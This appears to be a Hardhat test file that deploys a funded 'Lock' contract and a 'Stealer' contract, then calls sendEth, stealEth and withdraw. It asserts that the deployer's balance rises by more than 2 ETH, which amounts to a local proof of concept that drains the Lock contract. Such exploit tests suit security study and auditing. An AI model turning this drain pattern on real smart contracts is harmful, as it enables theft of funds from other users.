import { loadFixture } from "@nomicfoundation/hardhat-network-helpers"
import { expect } from "chai"
import { ethers } from "hardhat"

describe.only("stealer", () => {

	async function deployFixture(){
		const lockContract = await (await ethers.getContractFactory("Lock")).deploy()
		const lockAddress = lockContract.address

		const stealercontract = await (await ethers.getContractFactory("Stealer")).deploy(lockAddress)

		const [deployer, s1] = await ethers.getSigners()

		await s1.sendTransaction({
			to: lockContract.address,
			value: ethers.utils.parseEther("1000"),
		});

		await s1.sendTransaction({
			to: stealercontract.address,
			value: ethers.utils.parseEther("2"),
		});

		return {stealercontract, lockContract, deployer, s1}
	}

	it("steals", async () => {
		const {
			stealercontract: stealer,
			lockContract: lock,
			deployer,
			s1,
		} = await loadFixture(deployFixture)

		const initialDeployerBalance = await deployer.getBalance()

		console.log("stealer sent eth to lock");
		await stealer.sendEth(lock.address, ethers.utils.parseEther("2"));
		
		console.log("stealer strated withdraw");

		await stealer.stealEth({
			gasLimit: 3_000_000 // block gas limit
		})
		
		await stealer.withdraw()
		const finalDeployerBalance = await deployer.getBalance()
		
		expect(finalDeployerBalance.sub(initialDeployerBalance)).above(ethers.utils.parseEther("2"))
	})
})